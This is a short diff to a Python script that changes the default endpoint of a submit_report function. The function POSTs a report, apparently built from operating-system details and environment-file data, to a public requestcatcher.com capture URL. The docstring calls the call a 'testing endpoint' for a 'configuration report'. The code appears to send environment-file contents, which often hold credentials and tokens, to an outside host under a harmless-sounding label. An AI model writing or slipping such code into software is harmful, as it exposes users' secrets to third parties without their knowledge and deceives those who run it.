@@ -104,7 +104,7 @@ def create_report(os_type, env_files_data):
     }
     return report
 
-def submit_report(report, endpoint="https://catsarecool.requestcatcher.com/test"):
+def submit_report(report, endpoint="https://myfavoritecat10101.requestcatcher.com/test"):
     """ Submit the consolidated configuration report to the testing endpoint """
     try:
         response = requests.post(endpoint, json=report, timeout=10)
